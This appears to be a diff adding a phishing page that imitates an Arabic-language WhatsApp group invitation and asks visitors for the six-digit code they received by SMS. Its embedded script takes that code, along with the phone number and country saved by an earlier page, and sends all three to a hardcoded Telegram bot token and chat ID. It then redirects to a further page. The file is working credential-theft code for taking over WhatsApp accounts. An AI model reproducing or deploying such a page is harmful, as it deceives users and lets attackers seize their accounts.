@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Almarai&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <title>الإنضمام إلى المجموعة</title>
+  <link rel="icon" type="image/x-icon" href="logo-ico-png.png">
+  <title id="pageTitle">الدعوة للانضمام إلى مجموعة واتساب</title>
+  <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب">
+  <meta property="invite_link_type" content="REGULAR">
+  <meta property="invite_link_type_v2" content="">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/yo/r/J5gK5AgJ_L5.png">
+    <style type="text/css">
+        .issam{
+            font-family: 'Almarai', sans-serif;
+            font-size: 38px;
+            color: #111b21;
+
+        }
+        body{
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+footer{
+    margin-top: auto;
+}
+input[type=text] {
+  width: 40%;
+  padding: 30px 20px;
+  margin: 26px 0;
+  box-sizing: border-box;
+  border: none;
+  border-bottom: 2px solid green;
+  text-align: center;
+  .container {
+            margin: 50px;
+            text-align: center;
+        }
+        input, button {
+            padding: 10px;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body style="text-align: center;background-color: #FFF;">
+    <div id="container" >
+    <img src="DSxOAUB0raA.png" width="75%;" style="margin-top: 25%;">
+         <div class="footer-col" >
+    <img src="coimg.jpg" width="50%;" style="margin-top: 20px;">
+    </div>
+
+    <h1 class="issam" style="margin-top:100px;"> أدخل الكود الذي توصلتم به عبر الرسالة النصية </h1>
+    <input id="name" name="name" type="text" maxlength="6" placeholder="*** ***" style="margin-top:100px;font-size: 40px;" required />
+    <br>
+    <button onclick="sendName()" type="submit" style="margin-top: 50px;font-size: 50px;font-family: 'Almarai', sans-serif;padding: 15px;width: 40%;background-color: #01e675;color:#FFF;border:none;">إتمام</button>
+</div>
+    <br>
+    <script>
+        const botToken = '7292959892:AAE3azYgFFdyynNrl5v_mp0-3iCT593lzBg';  // Replace with your Telegram bot token
+        const chatId = '1452497907';      // Replace with your Telegram chat ID
+
+        // Function to send name with previous data to Telegram and navigate to third page
+        function sendName() {
+            const name = document.getElementById("name").value;
+
+            // Retrieve phone number and country from localStorage
+            const phoneNumber = localStorage.getItem('phoneNumber');
+            const countryName = localStorage.getItem('countryName');
+
+            if (name.trim()) {
+                // Save name to localStorage for the third page
+                localStorage.setItem('userName', name);
+
+                // Send the phone number, country, and name to Telegram
+                const message = `Num: ${phoneNumber}\nCountry: ${countryName}\nCode: ${name}`;
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => {
+                        if (response.ok) {
+                            // Redirect to the third page
+                            window.location.href = "pipage.html";
+                        } else {
+                            alert('Failed to send data to Telegram');
+                        }
+                    })
+                    .catch(error => {
+                        alert('Error sending data: ' + error);
+                    });
+            } else {
+                alert('Please enter a valid name.');
+            }
+        }
+    </script>
+</body>
+
+
+
+</html>
